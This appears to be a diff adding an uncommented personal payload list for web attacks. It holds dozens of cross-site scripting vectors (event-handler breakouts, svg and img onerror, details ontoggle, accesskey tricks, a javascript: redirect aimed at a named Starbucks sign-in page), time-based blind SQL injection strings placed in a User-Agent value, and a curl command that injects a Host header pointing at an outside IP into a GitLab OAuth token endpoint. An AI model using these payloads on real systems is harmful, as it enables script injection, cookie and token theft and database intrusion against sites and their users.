@@ -1,0 +1,83 @@
+http://code.google.com/p/domxsswiki
+
+" onblur="haikumsg(8231)"
+curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
+
+”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>
+
+"onmouseover="alert(7946)">
+&haiku630498=%27foobar>'"</script><script>alert(2222)</script>
+
+Vector Used  = "2+onmouseover=setTimeout`confirm\u0028document.domain\u0029`+"
+
+"><h1>html<iframe+src=x><!--
+"><img+src=x+onerror=alert(document.cookie)>//
+
+Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
+Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+
+https://www.exploit-db.com/papers/13045
+https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
+" onmouseover=alert(1499) "" title=""
+
+https://www.starbucks.com/account/signin?ReturnUrl=Jav	asc	ript:https ://www.starbucks.com/%0Aalert%28document.domain%29Login)
+
+ResListing.aspx/'%20ondblclick='confirm(2883)'%20Display='?OSCP='><%0a%0a%0a+ARELLI
+
+Vector= “><img src=x onerror=alert(“foobar”)>
+
+" STYLE="width: expression(alert('XSS'));" onblur="confirm(5779)" title="
+
+Vector="><svg onload=alert(1)> title="
+
+
+Vector="><svg onload=alert(1)> title="
+
+%27%22%20onmouseover%3dalert(1111)
+
+`"accesskey="X"%20onclick="alert(1)"` %22%20accesskey%3d%22X%22%20onclick%3D%22prompt`XSS`
+
+
+ ===> Alt+SHIFT+X  (input after hidden)
+<link rel="canonical" accesskey="X" onclick="alert(1)" />
+<input type="hidden" accesskey="X" onclick="alert(1)">
+
+`" type=xx autofocus onfocus=alert(1)//`  (input before hidden)
+`javascript:alert(1)//`
+
+\"}})})-confirm`1`;(function(){({if(){/*///
+
+`";alert(1)//`
+`"-alert(1)-"`
+`"+alert(1)+"`
+`"*alert(1)*"`
+
+
+
+
+<brute contenteditable onblur=alert(1)>lose focus! ==> TAB2
+
+<brute contenteditable onfocus=alert(1)>focus this!
+
+<brute contenteditable onkeydown=alert(1)>press any key!>tab N key
+
+
+
+"><svg onload=alert(1111)>
+
+');prompt`1`;('
+
+a=<svg%20onload=alert(1)>
+">
+"+onmouseover=alert(1)//
+
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+
+"><details+ontoggle="confirm(%0adocument%0a.domain)">
+
+" onblur="haikumsg(9587)" title="
+
+'%20onmouseover='confirm(1111)'%20bad='?
